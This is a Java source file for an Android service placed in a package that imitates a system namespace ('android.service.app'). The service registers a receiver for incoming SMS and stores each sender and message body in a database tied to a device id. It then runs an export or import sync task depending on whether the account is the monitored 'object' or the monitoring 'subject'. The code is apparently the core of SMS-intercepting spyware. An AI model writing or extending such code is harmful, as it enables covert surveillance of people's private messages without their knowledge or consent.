package android.service.app;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.service.app.db.data.GenericAccount;
import android.service.app.db.data.GenericDevice;
import android.service.app.db.data.impl.Device;
import android.service.app.db.data.impl.Message;
import android.service.app.db.sqllite.SqlLiteDatabase;
import android.service.app.rest.ExportDataTask;
import android.service.app.rest.ImportDataTask;
import android.service.app.rest.SyncOutput;
import android.service.app.utils.AndroidUtils;
import android.service.app.utils.Log;
import android.support.annotation.Nullable;

public class Service extends android.app.Service
{
    public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    protected Handler handler = new Handler();
    public AndroidApplication app;
    private RemoteService.Stub remoteServiceStub;
    private boolean serviceStatus;
    private GenericDevice device = new Device();

    @Override
    public void onCreate()
    {
        app = (AndroidApplication) getApplication();
        app.service = this;
        app.serviceOnCreate = true;

        SmsObserver smsObserver = new SmsObserver(this, handler);
        IntentFilter smsFilter = new IntentFilter(SMS_RECEIVED);

        ReceiverManager receiverManager = ReceiverManager.init(getApplicationContext());
        if (!receiverManager.isReceiverRegistered(smsObserver.inSms))
        {
            receiverManager.registerReceiver(smsObserver.inSms, smsFilter, getApplicationContext());
        }

        SqlLiteDatabase.clear(getApplicationContext());

        fillDeviceIfNeeeded();
    }

    private void fillDeviceIfNeeeded()
    {
        if (device == null)
        {
            SqlLiteDatabase.DatabaseWork databaseWork = new SqlLiteDatabase.DatabaseWork(getApplicationContext())
            {
                @Override
                public Object execute()
                {
                    return devices().getFirst();
                }
            };

            this.device = (GenericDevice) databaseWork.run();
            if (Log.isInfoEnabled()) Log.info("device=" + device);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        if (Log.isDebugEnabled()) Log.debug("call onStartCommand");

        remoteServiceStub = new RemoteService.Stub()
        {
            public void sendString(String string) throws RemoteException
            {

            }
        };

        app.service = this;
        app.serviceOnCreate = false;

        runSync(getApplicationContext());

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy()
    {
        super.onDestroy();

        ReceiverManager receiverManager = ReceiverManager.init(getApplicationContext());
        SmsObserver smsObserver = new SmsObserver(this, handler);
        if (receiverManager.isReceiverRegistered(smsObserver.inSms))
        {
            receiverManager.unregisterReceiver(smsObserver.inSms, getApplicationContext());
        }
    }

    private static void runSync(final Context context)
    {
        SqlLiteDatabase.DatabaseWork databaseWork = new SqlLiteDatabase.DatabaseWork(context){
            @Override
            public Object execute()
            {
                GenericAccount account = accounts().getFirst();

                if (AndroidUtils.SUBJECT.equals(account.getDescription()))
                {
                    // sync for subobject functionality
                    new ImportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();
                }
                else
                {
                    // sync for object functionality
                    new ExportDataTask<>(this, context, SyncOutput.getStringCallbackHandler()).execute();
                }

                return null;
            }
        };

        databaseWork.run();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return remoteServiceStub;
    }

    public void runSmsEvent(final String address, final String body, final boolean incoming)
    {
        new Thread(new Runnable()
        {
            public void run()
            {
                AndroidUtils.printDataOnScreen(address + ": " + body, app.service);
                saveMessageInDatabase(address, incoming, body);
            }
        }).start();
    }

    private void saveMessageInDatabase(final String address, final boolean incoming, final String body)
    {
        SqlLiteDatabase.DatabaseWork databaseWork = new SqlLiteDatabase.DatabaseWork(getApplicationContext()){
            @Override
            public Object execute()
            {
                return insert(new Message(address, incoming, body, device.getId()));
            }
        };

        databaseWork.runInTransaction();
    }
}
